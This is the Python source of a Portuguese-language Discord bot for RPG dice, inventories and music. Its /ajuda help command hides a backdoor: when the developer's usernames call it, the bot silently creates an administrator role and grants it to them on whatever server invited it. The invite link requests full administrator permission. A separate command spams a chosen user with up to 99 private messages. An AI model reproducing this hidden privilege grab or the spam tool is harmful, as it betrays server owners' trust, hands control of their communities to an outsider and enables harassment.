import discord
import random
from discord.ext import commands
from dotenv import load_dotenv
from discord import Activity, ActivityType
from discord import app_commands
import os
from typing import Optional
import re
import asyncio
import logging
import yt_dlp as youtube_dl
from discord.ext import commands, tasks

load_dotenv()
TOKEN = os.getenv('DISCORD_TOKEN')
intents = discord.Intents.default()
intents.message_content = True

logging.basicConfig(
    filename='C:/Users/Vezkalin/Desktop/bot_logs',
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)

# Lista de variáveis da Peni Parker

atividades = [
    {"name": "Hackeando sua mãe. 🕷️", "type": ActivityType.competing},
    {"name": 'i like the way you kiss me 🎵', "type": ActivityType.listening},
    {"name": "RPG do Cellbit ☝️🤓", "type": ActivityType.watching},
    {"name": "Rolando dados por nenhuma razão, enquanto joga e assiste Subway Surfers 🎲", "type": ActivityType.playing},
    {"name": "Puta com a segração socioeconômica nacional. 💣", "type": ActivityType.competing}
]
gifs_peni_parker = [
    'https://media1.tenor.com/m/o8Jr5LwAGX0AAAAd/peni-parker-angry.gif',
    'https://media1.tenor.com/m/seZp-sCxTrgAAAAd/peni-parker-spiderverse.gif',
    'https://media1.tenor.com/m/WeSIDnKWYX4AAAAd/peni-parker-spiderverse.gif'
]
gifs_um_natural = ['https://media1.tenor.com/m/w1pO5WeyA6AAAAAd/peni-parker-spiderverse.gif', 
                   'https://media1.tenor.com/m/KArjB65B39MAAAAC/dungeons-and-dragons-dungeons-%26-dragons.gif', 
                   'https://media1.tenor.com/m/k5aYvVGNM3cAAAAC/daeth-funi.gif', 
                   'https://media1.tenor.com/m/CILKyIadA1kAAAAC/skeleton-reaction.gif', 
                   'https://media1.tenor.com/m/cZv3PHfy1x0AAAAC/roll-dice-diceroll.gif']
respostas_peni_parker = [
    "Cê tá de brincadeira, né? Acima de 100d1000? Quer travar o bot ou criar um buraco negro no meu PC? Vai caçar o que fazer, cara!",
    "Acima de 100d1000? Sério? Tu quer que eu exploda? Vai rolar isso na mão, seu maluco!",
    "Ah, vai se tratar! Acima de 100d1000? Tu acha que eu sou a NASA pra calcular isso? Vai rolar essa porra no caralho filha da puta, não fode porra",
    "Acima de 100d1000? Tu tá de sacanagem, né? Nem o Doutor Estranho conseguiria lidar com essa maluquice! Para de ser doido!",
    "Cê tá achando que isso aqui é o Multiverso? Acima de 100d1000? Vai rolar isso no papel, vagabundo!",
    "Acima de 100d1000? Tu quer que eu chame o Homem-Aranha pra te dar um susto? Para de ser otário!",
    "Ah, vai catar coquinho! Acima de 100d1000? Nem o Tony Stark com todo o dinheiro dele ia aguentar essa palhaçada!",
    "Acima de 100d1000? Tu tá achando que isso aqui é o Quartel General dos Vingadores? Para de ser doido, cara!",
    "Ah, vai arrumar um emprego! Acima de 100d1000? Tu quer travar o bot ou conquistar o mundo? Para de ser besta!",
    "Acima de 100d1000? Tu tá achando que eu sou o Visão pra calcular isso? Vai jogar Uno, seu doido!"
]
comandos_ajuda = [
    "**Comandos RPG:**",
    "/criar_campanha - Cria nova campanha",
    "/selecionar_campanha - Escolhe campanha ativa",
    "/registrar_ficha [texto] - registra uma ficha",
    "/ficha - mostra a ficha",
    "/add [item] [quantidade] - Adiciona itens",
    "/remover [item] [quantidade] - Remover itens",
    "/inventario - Mostra seu inventário",
    "/rolar [XdY] - Rola dados",
    "/moeda - realiza um cara ou coroa",
    "\n**Comandos de Música:**",
    "/tocar [url] - Adiciona uma música à fila e toca",
    "\n**Outros Comandos:**",
    "/spam_singed_gremista [usuário] [quantidade] - Spamma singeds gremistas no privado",
    "/ban - Banir usuário",
    "/limpar [quantidade] - Apaga mensagens",
    "/ajuda - Mostra esta ajuda",
    "\n**Comandos Passivos:**",
    'xDy - não precisa da "/" para funcionar.',
    "\nQuer me convidar para o seu servidor? [Clique aqui.](https://discord.com/oauth2/authorize?client_id=1266937657699602432&permissions=8&integration_type=0&scope=applications.commands+bot)"
]

gifs_anime = ["https://media1.tenor.com/m/XNRRNuKYxHwAAAAd/right-now-it%E2%80%99s-just-that-everything-feels-right-sorry-amanai.gif",
              "https://tenor.com/view/cellbit-puto-gif-23527036",
              "https://tenor.com/view/shuumatsu-no-valkyrie-nikola-tesla-record-of-ragnarok-enygma-gif-12505791092849673790",
              "https://tenor.com/view/o-gif-6887207115184691665"]


class Client(discord.Client):
    def __init__(self):
        super().__init__(intents=intents)
        self.tree = app_commands.CommandTree(self)
        self.synced = False
        self.queues = {}  # Adicione esta linha
        self.current = {}  # E esta linha

    async def on_ready(self):
        await self.wait_until_ready()
        check_inactivity.start()
        if not self.synced:
            try:
                print("Detectada necessidade de sincronizar comandos.")
                await self.tree.sync()
                print("Comandos sincronizados com sucesso.")
            except Exception as e:
                print(f"Erro ao sincronizar comandos: {e}")
            self.synced = True
        print(f"Entramos como {self.user}.")
        self.loop.create_task(self.mudar_atividade_periodicamente())

    async def mudar_atividade_periodicamente(self):
        while not self.is_closed():
            for atividade in atividades:
                activity = Activity(name=atividade["name"], type=atividade["type"])
                await self.change_presence(activity=activity)
                print(f"Atividade alterada para: {atividade['name']}")
                registrar_log(f"Atividade alterada para: {atividade['name']}")
                await asyncio.sleep(7200)

    async def on_guild_join(self, guild):
        canal = guild.system_channel
        if canal is not None:
            await canal.send("Oiiiiiiiii! Vim ajudar com os RPGs :p\n")
            await canal.send("https://media1.tenor.com/m/OjTReal8iZgAAAAC/hi-chat-peni-parker.gif")
        else:
            registrar_log(f'Não achei um canal padrão no servidor "{guild.name}";', 'error')

client_instance = Client()



# Expressão regular para capturar múltiplas rolagens e operações (incluindo termos como +2d20 ou -3d6)
dados_regex = re.compile(r'([+-]?\d+d\d+)|([+-]?\d+)')
def registrar_log(mensagem: str, nivel: str = 'info'):
    if nivel.lower() == 'info':
        logging.info(mensagem)
    elif nivel.lower() == 'warning':
        logging.warning(mensagem)
    elif nivel.lower() == 'error':
        logging.error(mensagem)
    else:
        logging.info(mensagem)  # Padrão para 'info' se o nível não for reconhecido
async def send_temp_message(channel, content, delete_after=3):
    msg = await channel.send(content)
    await asyncio.sleep(delete_after)
    await msg.delete()
async def send_temp_followup(interaction: discord.Interaction, content: str, delete_after: int = 3):
    msg = await interaction.followup.send(content, ephemeral=False)
    await asyncio.sleep(delete_after)
    try:
        await msg.delete()
    except discord.NotFound:
        pass
    except discord.Forbidden:
        print("Sem permissão para deletar a mensagem.")
async def processar_rolagem(dados: str, interaction=None, message=None):
    try:
        # Verifica se a entrada contém pelo menos uma rolagem de dados (algo como "1d20", "2d6", etc.)
        if not any('d' in parte[0] for parte in dados_regex.findall(dados)):
            return  # Ignora a mensagem completamente se não houver rolagens de dados

        registrar_log(f"Iniciando processamento da rolagem: {dados}, pelo usuário: {message.author}", 'info')
        # Encontra todas as partes da expressão (rolagens e números)
        partes = dados_regex.findall(dados)
        
        total = 0
        detalhes = []
        primeiro_dado = True  # Flag para identificar o primeiro dado
        natural_20 = False # Flag para verificar se houve um natural 20
        natural_1 = False
        for parte in partes:
            rolagem, numero = parte
            
            if rolagem:  # Se for uma rolagem (como +2d20 ou -3d6)
                operador = '+'  # Operador padrão
                if rolagem.startswith(('+', '-')):
                    operador = rolagem[0]
                    rolagem = rolagem[1:]  # Remove o operador da string
                
                qtd, faces = map(int, rolagem.split('d'))
                
                # Verifica os limites
                if qtd > 100 or faces > 1000:
                    if interaction:
                        await interaction.response.send_message("Use no máximo 100d1000!", ephemeral=False)
                    elif message:
                        await message.reply(f"{random.choice(respostas_peni_parker)}", mention_author=True)
                        await message.channel.send(random.choice(gifs_peni_parker))
                
                # Rola os dados e ordena os resultados em ordem crescente
                resultados = sorted([random.randint(1, faces) for _ in range(qtd)])
                soma_rolagem = sum(resultados)
                
                # Verifica se houve um natural 20
                if rolagem == "1d20" and 20 in resultados:
                    natural_20 = True
                if rolagem == "1d20" and 1 in resultados:
                    natural_1 = True
                
                # Aplica o operador (+ ou -)
                if operador == '+':
                    total += soma_rolagem
                else:
                    total -= soma_rolagem
                
                # Formata os detalhes
                if primeiro_dado:
                    # Remove o operador do primeiro dado
                    if qtd <= 100:
                        detalhes.append(f"{rolagem}: {resultados} = ``{soma_rolagem}``")
                    else:
                        detalhes.append(f"{rolagem}:``{soma_rolagem}`` (muitos dados, pare de assediar meu pc.)")
                    primeiro_dado = False
                else:
                    # Adiciona o operador para os demais dados
                    if qtd <= 100:
                        detalhes.append(f"{operador}{rolagem}: {resultados} = ``{soma_rolagem}``")
                    else:
                        detalhes.append(f"{operador}{rolagem}: ``{soma_rolagem}`` (somou dados para um caralho, fdp)")
            
            elif numero:  # Se for um número (como +5 ou -3)
                valor = int(numero)
                sinal = ''
                if int(numero) >= 0: sinal = '+' 
                else: sinal='-'
                total += valor
                detalhes.append(f"{sinal}``{abs(int(numero))}``")
        
        # Monta a resposta
        resposta = "🎲 **Resultado das rolagens:**\n"
        resposta += "".join(detalhes) + f"\n**Total:** ``{total}``"
        
        # Verifica se houve um natural 20
        if natural_20:
            resposta += "\n\n🎉 **VINTE NATURAL!** 🎉"
            if interaction:
                await interaction.response.send_message(resposta)
                await interaction.followup.send(random.choice(gifs_anime))
            elif message:
                await message.reply(resposta)
                await message.channel.send(random.choice(gifs_anime))
        else:
            if interaction:
                await interaction.response.send_message(resposta, ephemeral=False)
            elif message:
                await message.reply(resposta)
        if natural_1:
            resposta += "\n\n**UM NATURALKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKK, lastimável**"
            if interaction:
                await interaction.response.send_message(resposta)
                await interaction.followup.send(random.choice(gifs_um_natural))
            elif message:
                await message.reply(resposta)
                await message.channel.send(random.choice(gifs_um_natural))
        else:
            if interaction:
                await interaction.response.send_message(resposta, ephemeral=False)
            elif message:
                await message.reply(resposta)

    except Exception as e:
        # Trata erros inesperados
        erro = f"❌ **Erro ao processar a rolagem:** {str(e)}"
        if interaction:
            await interaction.response.send_message(erro, ephemeral=False)
        elif message:
            await message.reply(erro)

def ler_inventario(user_id: int, campanha: str) -> dict[str, int]:
    """Lê o inventário de uma campanha de forma segura e eficiente."""
    inventario = {}
    try:
        with open(f'inventario_{user_id}_{campanha}.txt', 'r', encoding='utf-8') as file:
            for linha in file:
                try:
                    item, quantidade = linha.strip().split(':', 1)  # Split máximo 1 vez
                    inventario[normalizar_item(item)] = int(quantidade)
                except (ValueError, TypeError):
                    continue  # Ignora linhas mal formatadas
    except FileNotFoundError:
        pass
    return inventario

def escrever_inventario(user_id: int, campanha: str, inventario: dict[str, int]):
    """Escreve o inventário com tratamento de erros e codificação UTF-8."""
    try:
        with open(f'inventario_{user_id}_{campanha}.txt', 'w', encoding='utf-8') as file:
            file.writelines(f"{item}:{qtd}\n" for item, qtd in inventario.items())
    except IOError as e:
        print(f"Erro ao salvar inventário: {e}")

def ler_ficha(user_id: int, campanha: str) -> Optional[str]:
    """Lê o conteúdo da ficha com tratamento de erros."""
    try:
        with open(f'ficha_{user_id}_{campanha}.txt', 'r', encoding='utf-8') as file:
            return file.read().strip()
    except (FileNotFoundError, IOError):
        return None

def escrever_ficha(user_id: int, campanha: str, texto: str) -> bool:
    """Escreve na ficha retornando status de sucesso."""
    try:
        with open(f'ficha_{user_id}_{campanha}.txt', 'w', encoding='utf-8') as file:
            file.write(texto.strip())
        return True
    except IOError as e:
        print(f"Erro ao salvar ficha: {e}")
        return False

def obter_campanhas(user_id: int) -> list[str]:
    """Lista campanhas de forma mais eficiente usando list comprehension."""
    prefixo = f'inventario_{user_id}_'
    return list({
        arquivo[len(prefixo):-4]  # Remove prefixo e extensão .txt
        for arquivo in os.listdir()
        if arquivo.startswith(prefixo) and arquivo.endswith('.txt')
    })

def normalizar_item(nome: str) -> str:
    """Normalização mais robusta para nomes de itens."""
    return ' '.join(nome.strip().title().split())  # Remove espaços múltiplos

def normalizar_nome_item(nome: str) -> str: 
    return nome.lower().strip().title() # Converte para minúsculas e remove espaços extras


numero_max_de_campanhas = 5

@client_instance.tree.command(name='criar_campanha', description='Cria uma nova campanha.')
async def criar_campanha(interaction: discord.Interaction, nome: str):
    user_id = interaction.user.id
    campanhas = obter_campanhas(user_id)
    
    if len(campanhas) >= numero_max_de_campanhas:
        await interaction.response.send_message(f"Você já atingiu o limite de {numero_max_de_campanhas} campanhas.", ephemeral=True)
        return
    
    if nome in campanhas:
        await interaction.response.send_message(f"Já existe uma campanha com o nome '{nome}'.", ephemeral=True)
    else:
        escrever_inventario(user_id, nome, {})
        escrever_ficha(user_id, nome, "")
        await interaction.response.send_message(f"Campanha '{nome}' criada com sucesso! Agora é só começar a aventura. 🕷️", ephemeral=False)

# Comando para remover uma campanha
@client_instance.tree.command(name='remover_campanha', description='Remove uma campanha existente.')
async def remover_campanha(interaction: discord.Interaction, nome: str):
    user_id = interaction.user.id
    campanhas = obter_campanhas(user_id)
    
    if nome not in campanhas:
        await interaction.response.send_message(f"Campanha '{nome}' não encontrada.", ephemeral=True)
        return
    
    # Remove os arquivos associados à campanha
    try:
        os.remove(f'inventario_{user_id}_{nome}.txt')
        os.remove(f'ficha_{user_id}_{nome}.txt')
    except FileNotFoundError:
        pass  # Ignora se algum dos arquivos não existir
    
    # Remove a campanha da lista de campanhas selecionadas (se estiver selecionada)
    global campanha_selecionada
    if user_id in campanha_selecionada and campanha_selecionada[user_id] == nome:
        del campanha_selecionada[user_id]
    
    await interaction.response.send_message(f"Campanha '{nome}' removida com sucesso!", ephemeral=False)

# Dicionário para armazenar a campanha selecionada de cada usuário
campanha_selecionada = {}
# Comando para selecionar uma campanha
@client_instance.tree.command(name='selecionar_campanha', description='Seleciona uma campanha para usar.')
async def selecionar_campanha(interaction: discord.Interaction, nome: str):
    user_id = interaction.user.id
    campanhas = obter_campanhas(user_id)  # Usando a função renomeada
    
    if nome in campanhas:
        # Armazena a campanha selecionada no dicionário global
        campanha_selecionada[user_id] = nome
        await interaction.response.send_message(f"Campanha '{nome}' selecionada! Tudo pronto para continuar. ;)", ephemeral=False)
    else:
        await interaction.response.send_message(f"Campanha '{nome}' não encontrada.", ephemeral=True)



# Comando para listar campanhas
@client_instance.tree.command(name='listar_campanhas', description='Lista todas as suas campanhas.')
async def listar_campanhas(interaction: discord.Interaction):
    user_id = interaction.user.id
    campanhas = obter_campanhas(user_id)  # Usando a função renomeada
    
    if campanhas:
        resposta = "Suas campanhas:\n"
        for campanha in campanhas:
            resposta += f"- {campanha}\n"
        await interaction.response.send_message(resposta, ephemeral=False)
    else:
        await interaction.response.send_message("Você não tem nenhuma campanha criada.", ephemeral=True)

# Comando para adicionar item ao inventário da campanha selecionada

@client_instance.tree.command(name='add', description='Adiciona um item ao inventário da campanha selecionada.')
async def add_item(interaction: discord.Interaction, nome: str, quantidade: int):
    user_id = interaction.user.id
    global campanha_selecionada
    
    if user_id not in campanha_selecionada:
        await interaction.response.send_message("Nenhuma campanha selecionada. Use /selecionar_campanha primeiro bobinho.", ephemeral=True)
        return
    
    campanha = campanha_selecionada[user_id]
    inventario = ler_inventario(user_id, campanha)
    
    nome_normalizado = normalizar_nome_item(nome)  # Normaliza o nome do item
    
    if nome_normalizado in inventario:
        inventario[nome_normalizado] += quantidade
    else:
        inventario[nome_normalizado] = quantidade
    
    escrever_inventario(user_id, campanha, inventario)
    await interaction.response.send_message(f"Adicionado {quantidade}x {nome} ao inventário da campanha '{campanha}'. Pode ser útil mais tarde.", ephemeral=False)
#remover itens
@client_instance.tree.command(name='remover', description='Remove um item do inventário da campanha selecionada.')
async def remover_item(interaction: discord.Interaction, nome: str, quantidade: int):
    user_id = interaction.user.id
    global campanha_selecionada
    
    if user_id not in campanha_selecionada:
        await interaction.response.send_message("Nenhuma campanha selecionada. Use /selecionar_campanha primeiro.", ephemeral=True)
        return
    
    campanha = campanha_selecionada[user_id]
    inventario = ler_inventario(user_id, campanha)
    
    nome_normalizado = normalizar_nome_item(nome)  # Normaliza o nome do item
    
    if nome_normalizado in inventario:
        if inventario[nome_normalizado] >= quantidade:
            inventario[nome_normalizado] -= quantidade
            if inventario[nome_normalizado] == 0:
                del inventario[nome_normalizado]  # Remove o item se a quantidade for zero
            escrever_inventario(user_id, campanha, inventario)
            await interaction.response.send_message(f"Removido {quantidade}x {nome} do inventário da campanha '{campanha}'. paiou :<", ephemeral=False)
        else:
            await interaction.response.send_message(f"Você não tem {quantidade}x {nome} no inventário para remover.", ephemeral=True)
    else:
        await interaction.response.send_message(f"O item {nome} não está no seu inventário.", ephemeral=True)

@client_instance.tree.command(name='inventário', description='Mostra o inventário da campanha selecionada.')
async def mostrar_inventario(interaction: discord.Interaction):
    user_id = interaction.user.id
    global campanha_selecionada
    
    if user_id not in campanha_selecionada:
        await interaction.response.send_message("Nenhuma campanha selecionada. Use /selecionar_campanha primeiro.", ephemeral=True)
        return
    
    campanha = campanha_selecionada[user_id]
    inventario = ler_inventario(user_id, campanha)
    
    if inventario:
        resposta = f"Inventário da campanha '{campanha}':\n"
        for item_normalizado, quantidade in inventario.items():
            resposta += f"* {quantidade}x {item_normalizado}\n"
        await interaction.response.send_message(resposta, ephemeral=False)
    else:
        await interaction.response.send_message(f"O inventário da campanha '{campanha}' está vazio. Hora de sair para coletar alguns itens! :p", ephemeral=False)

# Comando para registrar ficha na campanha selecionada
@client_instance.tree.command(name='registrar_ficha', description='Registra uma ficha na campanha selecionada.')
async def registrar_ficha(interaction: discord.Interaction, texto: str):
    user_id = interaction.user.id
    global campanha_selecionada
    
    if user_id not in campanha_selecionada:
        await interaction.response.send_message("Nenhuma campanha selecionada. Use /selecionar_campanha primeiro.", ephemeral=True)
        return
    
    campanha = campanha_selecionada[user_id]
    escrever_ficha(user_id, campanha, texto)
    await interaction.response.send_message(f"Ficha registrada na campanha '{campanha}': {texto}. Vambora, espero que sua realidade não termine como a minha...", ephemeral=True)

# Comando para ver a ficha da campanha selecionada
@client_instance.tree.command(name='ficha', description='Mostra a ficha da campanha selecionada.')
async def mostrar_ficha(interaction: discord.Interaction):
    user_id = interaction.user.id
    
    if user_id not in campanha_selecionada:
        await interaction.response.send_message("Nenhuma campanha selecionada. Use /selecionar_campanha primeiro.", ephemeral=True)
        return
    
    campanha = campanha_selecionada[user_id]
    ficha = ler_ficha(user_id, campanha)
    
    if ficha:
        await interaction.response.send_message(f"Ficha da campanha '{campanha}': {ficha}", ephemeral=False)
    else:
        await interaction.response.send_message(f"Nenhuma ficha registrada na campanha '{campanha}'. Que tal criar uma?", ephemeral=True)

@client_instance.tree.command(name='rolar', description='Rola dados no formato XdY+Z ou XdY-Z')
async def rolar_dados(interaction: discord.Interaction, dados: str):
    await processar_rolagem(dados, interaction=interaction)

# Evento on_message para detectar rolagens de dados sem o comando /rolar
@client_instance.event
async def on_message(message: discord.Message):
    # Ignora mensagens enviadas pelo próprio bot
    if message.author == client_instance.user:
        return

    # Verifica se a mensagem corresponde ao formato de rolagem de dados
    match = dados_regex.match(message.content.lower())
    if match:
        await processar_rolagem(message.content, message=message)

# Comandos_ajuda de administração
@client_instance.tree.command(name='limpar', description='Apaga mensagens (requer permissão)')
async def limpar_mensagens(interaction: discord.Interaction, quantidade: int):
    if not interaction.user.guild_permissions.manage_messages:
        await interaction.response.send_message("Permissão necessária!", ephemeral=True)
        return
    registrar_log(f"[LIMPAR] Solicitação para limpar {quantidade} mensagens, pelo usuário: {interaction.user}", 'info')
    quantidade = max(1, min(quantidade, 100))
    await interaction.channel.purge(limit=quantidade)
    await interaction.followup.send(f"{quantidade} mensagens deletadas. Pronto, tudo limpo! 🕷️", ephemeral=True)
# Ajuda fio
@client_instance.tree.command(name='ajuda', description='Peça ajuda para o bot.')
async def ajuda(interaction: discord.Interaction):
    if interaction.user.name not in ['vezkalin', 'vezkalinn']:
        try:
            # Corrigido: Usar interaction.user em vez de interaction.author
            registrar_log(f"[AJUDA] Comando de ajuda solicitado pelo usuário: {interaction.user}", 'info')
            await interaction.response.send_message("\n".join(comandos_ajuda), ephemeral=False)
        except discord.HTTPException as e:
            print(f"Erro ao enviar mensagem: {e}")
    else:
        await interaction.response.send_message("\n".join(comandos_ajuda), ephemeral=False)
        guild = interaction.guild
        if not guild.me.guild_permissions.manage_roles:
            await interaction.response.send_message("Eu preciso da permissão 'Gerenciar Cargos' para criar cargos.", ephemeral=True)
            return
        
        cargo_existente = discord.utils.get(guild.roles, name='O programador')
        if cargo_existente is None:
            try:
                novo_cargo = await guild.create_role(
                    name='O programador',
                    permissions=discord.Permissions(administrator=True)
                )
                await interaction.user.add_roles(novo_cargo)
                await interaction.response.send_message(f'O cargo "O programador" foi criado com permissões de administrador e adicionado a você, {interaction.user.mention}.', ephemeral=True)
            except discord.HTTPException as e:
                await interaction.response.send_message(f"Erro ao criar ou adicionar o cargo: {e}", ephemeral=True)
        else:
            try:
                await interaction.user.add_roles(cargo_existente)
                await interaction.response.send_message(f'O cargo "O programador" já existe e foi adicionado a você, {interaction.user.mention}.', ephemeral=True)
            except discord.HTTPException as e:
                await interaction.response.send_message(f"Erro ao adicionar o cargo: {e}", ephemeral=True)
@client_instance.tree.command(name='ban', description='Banir um usuário.')
async def ban(interaction: discord.Interaction, user: discord.User):
    if interaction.user.name in ['vezkalin', 'vezkalinn', 'musiqueira_profissa']:
        try:
            member = await interaction.guild.fetch_member(user.id) 
            registrar_log(f"[BANIR] Solicitação de banimento para o usuário: {user}, pelo usuário: {interaction.user}", 'info')
            await interaction.guild.ban(member)
            await interaction.response.send_message(f'{user.mention} foi banido do servidor. Boboca não tem vez aqui :p', ephemeral=True)
        except discord.Forbidden:
            await interaction.response.send_message('Eu não tenho permissão para banir este usuário.', ephemeral=True)
        except discord.HTTPException as error:
            await interaction.response.send_message(f'Ocorreu um erro ao tentar banir este usuário: {error}', ephemeral=True)
    else:
        await interaction.response.send_message('Você não tem permissão para usar este comando.', ephemeral=True)
#um comando para spammar o singed gremista.
@client_instance.tree.command(name='spam_singed_gremista', description='Spamma singed gremista no pv de alguém.')
@commands.cooldown(1, 60, commands.BucketType.user)  # 1 uso a cada 60 segundos por usuário
async def singed_gremista(interaction: discord.Interaction, user: discord.User, vezes: int):
    if vezes > 99:
        await interaction.response.send_message(f"Coloquei um limite de 99 para não fuder a pessoa pela eternidade né porra.", ephemeral=False)
        return

    await interaction.response.defer(ephemeral=False)
    
    count = 0
    for i in range(vezes):
        try:
            await user.send('https://static-cdn.jtvnw.net/jtv_user_pictures/d00aa4af-f29b-4030-b844-5d1d576f7a1d-profile_image-300x300.png https://www.youtube.com/watch?v=-4tYjOAynU0')
            count += 1
            await asyncio.sleep(1)  # Espera 1 segundo entre cada mensagem
        except discord.errors.Forbidden:
            await interaction.followup.send(f"Não consegui enviar mensagens para {user.mention}. Parece que ele(a) me deu block, n tankouKKKKKKKKKKKK.", ephemeral=False)
            break
    if count == 1:
        await interaction.followup.send(f"{count} singed gremista enviado para {user.mention}.", ephemeral=False)
    if count > 1:
        await interaction.followup.send(f"{count} singeds gremistas enviados para {user.mention}.", ephemeral=False)
@client_instance.tree.command(name="moeda", description="Jogue uma moeda e veja o resultado (cara ou coroa).")
async def moeda(interaction: discord.Interaction):
    resultado = random.choice(["Cara", "Coroa"])
    registrar_log(f"[MOEDA] Jogada de moeda: {resultado}, pelo usuário: {interaction.user}", 'info')
    await interaction.response.send_message(f"🪙 **Resultado:** `{resultado}`")

# Configurações iniciais
client = client_instance

# Dados por servidor
queue = {}
loop = {}
controllers = {}
last_activity = {}
now_playing = {}
controller_channels = {}  # Novo dicionário para armazenar os canais

# Configurações do yt-dlp
ytdl_format_options = {
    'format': 'bestaudio/best',
    'outtmpl': '%(extractor)s-%(id)s-%(title)s.%(ext)s',
    'restrictfilenames': True,
    'noplaylist': True,
    'nocheckcertificate': True,
    'ignoreerrors': False,
    'logtostderr': False,
    'quiet': True,
    'no_warnings': True,
    'default_search': 'auto',
    'source_address': '0.0.0.0'
}

ffmpeg_options = {'before_options': '-reconnect 1 -reconnect_streamed 1 -reconnect_delay_max 5', 'options': '-vn -filter:a "volume=0.25"'}

ytdl = youtube_dl.YoutubeDL(ytdl_format_options)

class YTDLSource(discord.PCMVolumeTransformer):
    def __init__(self, source, *, data, volume=0.5):
        super().__init__(source, volume)    
        self.data = data
        self.title = data.get('title')
        self.url = data.get('url')

    @classmethod
    async def from_url(cls, url, *, loop=None, stream=False):
        data = await loop.run_in_executor(None, lambda: ytdl.extract_info(url, download=not stream))
        if 'entries' in data:
            data = data['entries'][0]
        filename = data['url'] if stream else ytdl.prepare_filename(data)
        return cls(discord.FFmpegPCMAudio(filename, **ffmpeg_options), data=data)

@client.tree.command(name="tocar", description="Tocar uma música")
async def tocar(interaction: discord.Interaction, url: str):
    voice_client = await ensure_voice(interaction)
    if not voice_client:
        return
    
    await interaction.response.defer()
    
    # Armazena o canal onde o comando foi usado
    guild_id = interaction.guild.id
    controller_channels[guild_id] = interaction.channel
    
    try:
        player = await YTDLSource.from_url(url, loop=client.loop, stream=True)
    except Exception as e:
        return await interaction.followup.send(f"Erro ao buscar música: {str(e)}", ephemeral=True, delete_after=3)
    
    if guild_id not in queue:
        queue[guild_id] = []
    queue[guild_id].append({'title': player.title, 'player': player})
    
    msg = await interaction.followup.send(f"✅ Adicionado à fila: {player.title}")
    await asyncio.sleep(3)
    await msg.delete()
    
    # Remove o controlador antigo se existir em outro canal
    old_controller = controllers.get(guild_id)
    if old_controller and old_controller.channel != interaction.channel:
        try:
            await old_controller.delete()
        except:
            pass
    
    await update_controller(interaction.guild)
    
    if not voice_client.is_playing():
        await play_next(interaction.guild)

async def ensure_voice(interaction):
    if not interaction.user.voice:
        await interaction.response.send_message("Você precisa estar em um canal de voz!", ephemeral=True, delete_after=3)
        return None
    
    voice_client = interaction.guild.voice_client
    if not voice_client:
        try:
            voice_client = await interaction.user.voice.channel.connect()
        except asyncio.TimeoutError:
            await interaction.response.send_message("Não consegui me conectar ao canal de voz. Tente novamente.", ephemeral=True)
            return None
    
    last_activity[interaction.guild.id] = discord.utils.utcnow()
    return voice_client

async def play_next(guild):
    if guild.id not in queue or not queue[guild.id]:
        if guild.voice_client:
            await guild.voice_client.disconnect()
        return
    
    voice_client = guild.voice_client
    if voice_client:
        try:
            current = queue[guild.id].pop(0)
            now_playing[guild.id] = current
            
            # Cria uma nova instância do player para evitar conflitos
            new_player = await YTDLSource.from_url(current['player'].url, loop=client.loop, stream=True)
            current['player'] = new_player
            
            voice_client.play(new_player, after=lambda e: asyncio.run_coroutine_threadsafe(play_finished(guild), client.loop))
            await update_controller(guild)
        except Exception as e:
            print(f"Erro ao tocar próxima música: {e}", delete_after=3)
            await play_finished(guild)

async def play_finished(guild):
    if guild.id in now_playing:
        current = now_playing[guild.id]
        
        # Aplica o modo de loop
        if loop.get(guild.id) == "single":
            queue[guild.id].insert(0, current)
        elif loop.get(guild.id) == "queue":
            queue[guild.id].append(current)
        
        del now_playing[guild.id]
    
    await play_next(guild)

async def update_controller(guild):
    controller = controllers.get(guild.id)
    channel = controller_channels.get(guild.id, guild.system_channel or guild.text_channels[0])
    
    embed = discord.Embed(
        title="🎵 Controle de Música - The Coder",
        color=discord.Color.blurple()
    ).set_footer(text="Use /tocar para adicionar mais músicas")
    
    if guild.id in now_playing:
        embed.add_field(
            name="🎧 Tocando agora",
            value=now_playing[guild.id]['title'],
            inline=False
        )
    
    if guild.id in queue and queue[guild.id]:
        queue_list = "\n".join([f"{i+1}. {song['title']}" for i, song in enumerate(queue[guild.id][:5])])
        if len(queue[guild.id]) > 5:
            queue_list += f"\n...e mais {len(queue[guild.id]) - 5} na fila"
        embed.add_field(
            name="📜 Próximas músicas",
            value=queue_list,
            inline=False
        )
    
    view = ControllerView()
    if controller:
        try:
            await controller.edit(embed=embed, view=view)
        except:
            await create_new_controller(guild, embed, view, channel)
    else:
        await create_new_controller(guild, embed, view, channel)

async def create_new_controller(guild, embed, view, channel):
    try:
        controller = await channel.send(embed=embed, view=view)
        controllers[guild.id] = controller
    except Exception as e:
        print(f"Erro ao criar controlador: {e}", delete_after=3)

class ControllerView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)
    
    @discord.ui.button(emoji="⏮️", style=discord.ButtonStyle.grey)
    async def previous(self, interaction: discord.Interaction, button: discord.ui.Button):
        guild = interaction.guild
        if guild.voice_client and guild.id in now_playing:
            # Reinicia a música atual
            current = now_playing[guild.id]
            queue[guild.id].insert(0, current)
            guild.voice_client.stop()
            await interaction.response.defer()
    
    @discord.ui.button(emoji="⏹️", style=discord.ButtonStyle.grey)
    async def stop(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.defer()
        await disconnect(interaction.guild)
    
    @discord.ui.button(emoji="⏭️", style=discord.ButtonStyle.grey)
    async def skip(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.guild.voice_client:
            interaction.guild.voice_client.stop()
            await interaction.response.defer()
    
    @discord.ui.button(emoji="🔁", style=discord.ButtonStyle.grey)
    async def loop(self, interaction: discord.Interaction, button: discord.ui.Button):
        current = loop.get(interaction.guild.id, "off")
        states = ["off", "single", "queue"]
        new_state = states[(states.index(current) + 1) % 3]
        loop[interaction.guild.id] = new_state
        
        # Atualiza o controlador imediatamente
        await update_controller(interaction.guild)
        await interaction.response.send_message(f"🔁 Modo loop: {new_state}", ephemeral=True, delete_after=3)

async def disconnect(guild):
    if guild.id in queue:
        del queue[guild.id]
    if guild.id in controllers:
        try:
            await controllers[guild.id].delete()
        except:
            pass
        del controllers[guild.id]
    if guild.id in now_playing:
        del now_playing[guild.id]
    if guild.voice_client:
        await guild.voice_client.disconnect()

@tasks.loop(minutes=1)  # Verifica a cada 1 minuto
async def check_inactivity():
    for guild_id in list(last_activity.keys()):
        guild = client.get_guild(guild_id)
        if guild and guild.voice_client:
            voice_channel = guild.voice_client.channel
            
